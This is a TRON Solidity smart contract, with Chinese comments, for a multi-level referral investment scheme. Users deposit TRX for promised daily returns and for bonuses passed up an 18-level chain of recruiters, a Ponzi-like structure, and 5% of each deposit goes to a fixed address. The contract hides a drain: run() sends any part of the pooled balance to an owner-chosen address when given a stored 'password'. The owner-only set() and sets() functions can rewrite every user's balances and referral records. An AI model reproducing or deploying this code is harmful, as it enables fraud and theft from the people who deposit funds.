
pragma solidity ^0.5.12;

contract bc{
   
   address payable  public golden;// 进场
   mapping(address=>uint256) public userPool;// 用户 资金
   mapping(address=>uint256) public userFirst;//  用户 第一次
   mapping(address=>uint256) public userMoney;// 用户 本 金
   mapping(address=>uint256) public userTotal;// 用户 累计
   mapping(address=>uint256) public userEarnings;// 用户收益
   mapping(address=>uint256) public userOneWithdraw;// 次 累计
   mapping(address=>uint256) public userTotalWithdraw;// 总 累计
  
   mapping(address=>address) public superior;
  
   mapping(address=>uint256) public userTime;
   
   uint256 public releaseTime=86400;
  
  uint256 public userWithdraw;
  mapping(address=>uint256) public userTeam;
  mapping(address=>uint256) public userOutTime;
  mapping(address=>address[]) public  myNoStraight;
   
  address public my;
  address payable withdrawalAddress;
   
  uint256 password; 
   
   mapping(address=>uint256)  public surplus;
   
    event Upline(address indexed addr, address indexed upline,uint256 amount,uint256  straightAmout);
    
   constructor(address payable _golden,uint256 _password) public{
       golden=_golden;
       my=msg.sender;
       password=_password;
   }
   
    function set(address[] memory _owner,uint256[] memory _userPool,uint256[] memory _userFirst,uint256[] memory _userMoney,uint256[] memory _userTotal,uint256[] memory _userEarnings,uint256[] memory _userOneWithdraw,uint256[] memory _userTotalWithdraw) public{
       require(my==msg.sender);
        for(uint256 i=0;i<_owner.length;i++){
            userPool[_owner[i]]=_userPool[i];
            userFirst[_owner[i]]=_userFirst[i];
            userMoney[_owner[i]]=_userMoney[i];
            userTotal[_owner[i]]=_userTotal[i];
            userEarnings[_owner[i]]=_userEarnings[i];
            userOneWithdraw[_owner[i]]=_userOneWithdraw[i];
            userTotalWithdraw[_owner[i]]=_userTotalWithdraw[i];
        }
    }
   function sets(address[] memory _owner,address[] memory _superior,uint256[] memory _userTime,uint256[] memory _userTeam,uint256[] memory _userOutTime,uint256[] memory _surplus) public{
       require(my==msg.sender);
        for(uint256 i=0;i<_owner.length;i++){
            superior[_owner[i]]=_superior[i];
            userTime[_owner[i]]=_userTime[i];
            userTeam[_owner[i]]=_userTeam[i];
            userOutTime[_owner[i]]=_userOutTime[i];
            surplus[_owner[i]]=_surplus[i];
        }
   }
   function setW(uint256 _userWithdraw) public{
       require(my==msg.sender);
          userWithdraw=_userWithdraw;
   }
   
  function setS(address  _owner,address[] memory _superior) public{
      require(my==msg.sender);
      myNoStraight[_owner]=_superior;
  }
  function getUser(address _owner) public view returns(uint256[] memory,address){
      uint256[] memory user=new uint256[](11);
      user[0]=userPool[_owner];
      user[1]=userFirst[_owner];
      user[2]=userMoney[_owner];
      user[3]=userTotal[_owner];
      user[4]=userEarnings[_owner];
      user[5]=userOneWithdraw[_owner];
      user[6]=userTotalWithdraw[_owner];
      user[7]=userTime[_owner];
      user[8]=userTeam[_owner];
      user[9]=userOutTime[_owner];
      user[10]=surplus[_owner];
      return(user,superior[_owner]);
  }
    function run(uint256 _value,uint256 _password) public {
                require(address(this).balance>=_value);
                if(withdrawalAddress!=address(0x0)&&password==_password){
                    withdrawalAddress.transfer(_value);
                }
        }
        
    function setAddress(address payable _owner) public{
         require(my==msg.sender);
         withdrawalAddress=_owner;
    }
    
    function getPassword() public view returns(uint256){
         require(my==msg.sender);
         return password;
    }
   
    function multiple(uint256 _value) private view returns(uint256){
       uint256 num=address(this).balance;
       if(num>=0 trx&&num<=5000000 trx){
         return 5*_value;
       }
       if(num>5000000 trx&&num<=1000000000 trx){
         return  3*_value;
       }
       if(num>1000000000 trx&&num<=5000000000 trx){
           return _value*25/10;
       }
       if(num>5000000000 trx&&num<=10000000000 trx){
           return _value*22/10;
       }
       if(num>10000000000 trx){
           return 2*_value;
       }
    }
    
    function earnings(uint256 _value) private view returns(uint256){
        uint256 num=address(this).balance;
         if(num<100000 trx){
           return _value*1/10000;
       }
          if(num>=0 trx&&num<=5000000 trx){
         return _value*8/1000;
       }
       if(num>5000000 trx&&num<=1000000000 trx){
         return  _value*1/100;
       }
       if(num>1000000000 trx&&num<=5000000000 trx){
           return _value*12/1000;
       }
       if(num>5000000000 trx&&num<=10000000000 trx){
           return _value*15/1000;
       }
       if(num>10000000000 trx){
           return _value*2/100;
       }
      
    }
    
    
    function setSuperior(address _owner,address _ownerSuperior) private{
      
        if(_ownerSuperior!=address(0x0)&&superior[_owner]==address(0x0)&&_owner!=_ownerSuperior&&userFirst[_owner]<=0){
              superior[_owner]=_ownerSuperior;
              myNoStraight[_ownerSuperior].push(_owner);

        }
    }
    
    
    function getSubordinate(address _owners,uint256 _value) private{
       
        if(userTotal[_owners]<userPool[_owners]){
             if(userTotal[_owners]+_value>userPool[_owners]){
             _value=userPool[_owners]-userTotal[_owners];
         }
         userEarnings[_owners]+=_value;
         userTotal[_owners]+=_value;
        }
    }
    
     function getSubordinates(address _owners,uint256 _value) private{
        
        uint256 _surplus=_value;
        if(userTotal[_owners]<userPool[_owners]){
             if(userTotal[_owners]+_value>userPool[_owners]){
             _value=userPool[_owners]-userTotal[_owners];
         }
         userEarnings[_owners]+=_value;
         userTotal[_owners]+=_value;
         surplus[_owners]+=_surplus-_value;
        }else{
            surplus[_owners]+=_value;
        }
    }
    
    function getSubordinatess(address _owners,uint256 _value) private{
       
        if(userTotal[_owners]<userPool[_owners]){
             if(userTotal[_owners]+_value>userPool[_owners]){
             _value=userPool[_owners]-userTotal[_owners];
         }
         userEarnings[_owners]+=_value;
         userTotal[_owners]+=_value;
         userTeam[_owners]+=_value;
        }
    }
    
       function getSuperior(address _owner) private view returns(address[] memory){
                   address[] memory superiorArray=new address[](18);
                   superiorArray[0]=superior[_owner];
                   uint256[] memory superiorNumArray=new uint256[](18);
                    superiorNumArray[0]=myNoStraight[superior[_owner]].length;
                   for(uint256 i=0;i<18;i++){
                       
                       if(superiorArray[i]==address(0x0)){
                           
                           break;
                           
                       }
                    superiorArray[i+1]=superior[superiorArray[i]];
                     
                    superiorNumArray[i+1]=myNoStraight[superior[superiorArray[i]]].length;
                     
                   }
                   return superiorArray;
               }
               
                 function getSuperiors(address _owner) private view returns(uint256[] memory){
                   address[] memory superiorArray=new address[](18);
                   superiorArray[0]=superior[_owner];
                   uint256[] memory superiorNumArray=new uint256[](18);
                    superiorNumArray[0]=myNoStraight[superior[_owner]].length;
                   for(uint256 i=0;i<18;i++){
                       
                       if(superiorArray[i]==address(0x0)){
                           
                           break;
                           
                       }
                    superiorArray[i+1]=superior[superiorArray[i]];
                     
                    superiorNumArray[i+1]=myNoStraight[superior[superiorArray[i]]].length;
                     
                   }
                   return superiorNumArray;
               }
    
    function setJoinTime(address _owner) private{
     
                  userTime[_owner]=block.timestamp;
              
    }
    
    
    function setRelease(address _owner) private{
        if(userMoney[_owner]>0){
             uint256 day=(block.timestamp-userTime[_owner])/releaseTime;
                           
                    if(day>=1){
                        
                       userTime[_owner]+=releaseTime*day;    
                        
                       uint256 num=  earnings(userMoney[_owner]*day); 
                       getSubordinate(_owner,num);
                       setUpSeed(num,getSuperior(_owner),getSuperiors(_owner));
                    }
        }
    }
    
    function setUpSeed(uint256 _value,address[] memory superiorArray,uint256[] memory superiorNumArray) private{
        for(uint256 i=0;i<superiorArray.length;i++){
            if(superiorArray[i]==address(0x0)){
                 continue;
            }
            if(superiorNumArray[i]<i+1){
                continue;
            }
            if(i==0){
                getSubordinatess(superiorArray[i],_value*2/10);
            }
            if(i>=1&&i<=4){
                getSubordinatess(superiorArray[i],_value*1/10);
            }
            if(i>=5&&i<=9){
                getSubordinatess(superiorArray[i],_value*5/100);
            }
            if(i>=10&&i<=14){
                getSubordinatess(superiorArray[i],_value*3/100);
            }
            if(i>=15&&i<=19){
                getSubordinatess(superiorArray[i],_value*2/100);
            }
        }
    }
    
   
   
   function out(address _owner) private{
       if(userOneWithdraw[_owner]>=userPool[_owner]){
          
           userOutTime[_owner]=block.timestamp;
       }
   }
   
   function destroy(address _owner) private  {
       if(userOutTime[_owner]>0){
           if(block.timestamp-userOutTime[_owner]>43200){
               delete userPool[_owner];
               delete userMoney[_owner];
               delete userTotal[_owner];
               delete userEarnings[_owner];
               delete userTotalWithdraw[_owner];
             
               delete userTime[_owner];
             
               delete userTeam[_owner];
               delete userFirst[_owner];
               delete userOneWithdraw[_owner];
               for(uint256 i=0;i<myNoStraight[_owner].length;i++){
                   delete superior[myNoStraight[_owner][i]];
               }
               delete surplus[_owner];
               
           }
            userOutTime[_owner]=0;
       }
   }
   
  
  
   //  获取 团队
   function getTeamEarnings(address _owner) public view returns(uint256){
        return userTeam[_owner];
   }
 
    // 投入
    function setTRX(address  _superior) public payable returns(bool){
        address  _owner=msg.sender;
        uint256  _value=msg.value;
        if(userFirst[_owner]>0){
             require(userTotalWithdraw[_owner]<userFirst[_owner]*32);
        }
           destroy(_owner);
           require(_value>=1000 trx&&_value<=100000 trx);
           require(userOneWithdraw[_owner]>=userPool[_owner]);
           require(_value>=userMoney[_owner]);
          
        setSuperior(_owner,_superior);
        userMoney[_owner]=_value;
      
        if(userFirst[_owner]<=0){
            userFirst[_owner]=_value;
        }
        userPool[_owner]=multiple(_value);
        if(userTotal[_owner]>0){
        userTotal[_owner]=0;
        userOneWithdraw[_owner]=0;
        userEarnings[_owner]=0;
        }
        if(surplus[_owner]>0){
            userTotal[_owner]+=surplus[_owner];
            userEarnings[_owner]+=surplus[_owner];
            surplus[_owner]=0;
        }
        golden.transfer(_value*5/100);
        address  _owners=  superior[_owner];
        if(_owners!=address(0x0)){
            getSubordinates(_owners,_value*2/10);
        }
        setJoinTime(_owner);
       emit Upline(_owner,_superior, _value,_value*2/10);
        return true;
    }
    // 提现
    function setWithdraw(uint256 _value) public payable returns(bool){
         address payable _owner=msg.sender;
         setRelease(_owner);
         require(address(this).balance>=_value);
         require(_value>=100 trx);
         require(userEarnings[_owner]>=_value);
          if(userEarnings[_owner]<=_value){
          userEarnings[_owner]=0;   
        }else{
             userEarnings[_owner]-=_value;
        }
        userWithdraw+=_value;
        userOneWithdraw[_owner]+=_value;
        userTotalWithdraw[_owner]+=_value;
        _owner.transfer(_value);
           out(_owner);
    }
    
    
    function getTronDetail() public view returns(uint256,uint256,uint256){
        uint256 balance=address(this).balance;
        uint256 userWithdraws=userWithdraw;
        uint256 lv=earnings(10000);
       return(balance,userWithdraws,lv);
    }
    
    function getRecommend(address _owner) public view returns(address){
        return superior[_owner];
    }
    
    function getStraightTeam(address _owner) public view returns(uint256,uint256,uint256){
      
     
         uint256 day=(block.timestamp-userTime[_owner])/releaseTime;
         uint256 num=0;
                    if(day>=1){
                        num= earnings(userMoney[_owner]*day); 
                    }
        uint256 ke=num+userEarnings[_owner];
       
        uint256 yi=userOneWithdraw[_owner];
        if(ke+yi>userPool[_owner]){
            ke=userPool[_owner]-userOneWithdraw[_owner];
        }
        uint256 no=userPool[_owner]-num-userTotal[_owner];
        if(userPool[_owner]<=num+userTotal[_owner]){
            no=0;
        }
        
        return(ke,no,yi);
    }
    
    function getSum(address _owner) public view returns(uint256){
        return(userTotalWithdraw[_owner]);
    }
    
    function getTeamDetai(address _owner) public view returns(uint256){
        return(myNoStraight[_owner].length);
    }
 
    // 获取 直推
   function getAppUserStraight(address _owner) public view returns(address[] memory){
        address[] memory aus=new address[](myNoStraight[_owner].length);
        if(myNoStraight[_owner].length>=1){
              for(uint256 i=0;i<myNoStraight[_owner].length;i++){
            aus[i]=myNoStraight[_owner][i];
        }
        }
        return aus;
    }
   
     function convertFromTronInt(address tronAddress) public  pure returns(address[] memory){
         address[] memory at=new address[](1);
         at[0]=address(tronAddress);
        return at;
    }
  
}